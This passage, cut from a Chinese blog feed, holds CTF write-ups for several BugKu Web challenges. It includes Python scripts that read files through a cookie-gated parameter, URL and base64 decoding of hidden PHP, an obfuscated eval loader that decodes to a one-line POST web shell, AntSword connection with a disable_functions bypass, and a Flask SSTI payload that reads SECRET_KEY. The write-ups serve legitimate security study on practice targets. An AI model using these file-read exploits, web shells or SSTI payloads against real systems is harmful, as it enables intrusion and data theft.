title="cookies"></a>cookies</h2><p>进入后发现url有line和filename两个参数</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10608/index.php?line=&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure><p>base64解码<strong>a2V5cy50eHQ&#x3D;<strong>发现是</strong>keys.txt</strong>，故写脚本尝试读取index.php源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">str</span>(base64.b64encode(<span class="string">b&#x27;index.php&#x27;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#index.php的base64编码</span></span><br><span class="line"><span class="comment"># print(filename)</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">url = <span class="string">f&#x27;http://114.67.175.224:10608/index.php?line=<span class="subst">&#123;i&#125;</span>&amp;filename=<span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line">response = requests.get(url=url)</span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动解码</span></span><br><span class="line"><span class="keyword">if</span>(response.text==<span class="string">&#x27;&#x27;</span>):</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable">$line</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123; <span class="comment">//cookie字段中margin的值为margin</span></span><br><span class="line"><span class="variable">$file_list</span>[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>编写exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">str</span>(base64.b64encode(<span class="string">b&#x27;keys.php&#x27;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#keys.php的base64编码</span></span><br><span class="line">url = <span class="string">f&#x27;http://114.67.175.224:10608/index.php?line=&amp;filename=<span class="subst">&#123;filename&#125;</span>&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>:<span class="string">&quot;margin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>运行后即可得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$key</span>=<span class="string">&quot;flag&#123;99d5704e2ff0effef5f671361d5fe141&#125;&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><p>F12查看发现1p.html页面</p><p><img src="https://s2.loli.net/2022/04/25/9M8eHgKajVChkXu.png" alt="never1.png"></p><p>直接跳转发现会一直跳转到<a href="https://www.bugku.com/">BugKu</a>这个地址，故直接view-source查看源码</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">view-source:http://114.67.175.224:11348/1p.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/25/vO5dgTaExQKU27w.png" alt="never2.png"></p><p>输出NewWords得到解码后内容</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://www.bugku.com&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--&gt;</span></span><br></pre></td></tr></table></figure><p>发现注释里还有base64编码，故进行解码得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%22%3Bif(!%24_GET%5B&#x27;id&#x27;%5D)%0A%7B%0A%09header(&#x27;Location%3A%20hello.php%3Fid%3D1&#x27;)%3B%0A%09exit()%3B%0A%7D%0A%24id%3D%24_GET%5B&#x27;id&#x27;%5D%3B%0A%24a%3D%24_GET%5B&#x27;a&#x27;%5D%3B%0A%24b%3D%24_GET%5B&#x27;b&#x27;%5D%3B%0Aif(stripos(%24a%2C&#x27;.&#x27;))%0A%7B%0A%09echo%20&#x27;no%20no%20no%20no%20no%20no%20no&#x27;%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20%40file_get_contents(%24a%2C&#x27;r&#x27;)%3B%0Aif(%24data%3D%3D%22bugku%20is%20a%20nice%20plateform!%22%20and%20%24id%3D%3D0%20and%20strlen(%24b)%3E5%20and%20eregi(%22111%22.substr(%24b%2C0%2C1)%2C%221114%22)%20and%20substr(%24b%2C0%2C1)!%3D4)%0A%7B%0A%09%24flag%20%3D%20%22flag%7B***********%7D%22%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20!!!%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure><p>再次进行url解码即可得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="comment">//id不能为空</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>)) <span class="comment">//a中不能含有&#x27;.&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>); <span class="comment">//可以利用，php://input</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;***********&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload放入burp发送(参考<a href="https://blog.csdn.net/qq_41333578/article/details/92759619">wp</a>)</p><p><img src="https://s2.loli.net/2022/04/25/dcgGBNpu6atPL97.png" alt="never3.png"></p><h2 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h2><p><img src="https://s2.loli.net/2022/04/25/odAQMfma1OIHBbU.png" alt="bypass.png"></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/weixin_46578840/article/details/120140214?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&utm_relevant_index=4">wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123962077">wp2</a></p></blockquote><p>发现php混淆后的代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">6</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV</span> = <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">18</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">1</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">7</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>.= <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">22</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">36</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">29</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">32</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">35</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>(<span class="string">&quot;&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解码（我是一步步用base64解码的，主要是找到eval里面的内容，注意是有一次解码会出现两段php代码，第二段才是要的源码)，下面代码运行后即可获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// define(&#x27;njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT&#x27;,pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn);</span></span><br><span class="line"><span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$HbXdtGUkeEDlRgpwsarfnVYoTSKIcPvhCWjBizQLZxFMuymANqJO</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>=<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$HbXdtGUkeEDlRgpwsarfnVYoTSKIcPvhCWjBizQLZxFMuymANqJO</span>.=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>=<span class="string">&quot;WtCxsqEuLNTSGRkVfZKHjUYPIognBiFhrbyOXacAelmwpJdzvQDMFbRYnLeWuGTKsNZvOpcgErtXBxCQljVfDwSmyqHikPMzdJaIoAhUXh9zqgiGRMfdp2fnqFaxaV9MqFYPcs5LvQPIAPd2kgJUq0pppe5opMGQN3vfa0NctMYzT1GNNrfKvF1uqrVxkZPhpyNATyVtv1Admz0cAsv2tFzxJV9AT1GrF3PbwsPIqyGdH2Pow2bacTn=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>(<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>*<span class="number">2</span>),<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>),<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="number">0</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用中国蚁剑连接（使用插件disable_functions），连接后发现只能看html目录下的东西。</p><p><img src="https://s2.loli.net/2022/04/25/ti2E6mdAYTXsfqB.png" alt="getshell1.png"></p><p>用蚁剑连接 .antproxy.php</p><p><img src="https://s2.loli.net/2022/04/25/BQ28ELpHonSjU3O.png" alt="getshell2.png"></p><p>根目录下找到flag</p><p><img src="https://s2.loli.net/2022/04/25/jYuGEBn4b382MNH.png" alt="getshell3.png"></p><p><img src="https://s2.loli.net/2022/04/25/ucUkJHMwlmhVyXZ.png" alt="getshell4.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web 刷题记录1</title>
      <link href="/2022/04/24/BugKu-Web1/"/>
      <url>/2022/04/24/BugKu-Web1/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录1"><a href="#BugKu-Web-刷题记录1" class="headerlink" title="BugKu Web 刷题记录1"></a>BugKu Web 刷题记录1</h1><blockquote><p>参考：</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://www.secpulse.com/archives/146728.html">BugKu-Web-wp3</a></p><p><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p></blockquote><h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>F12查看源码</p><p><img src="https://s2.loli.net/2022/04/24/XbFRket7Y6Kl4C8.png" alt="SSTI1.png"></p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17350/?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/l3KfC9Ap51EM8vr.png" alt="SSTI11.png"></p><h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p><img src="https://s2.loli.net/2022/04/24/7d1ugKRv3ZNfxas.png" alt="SSTI2.png"></p><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" 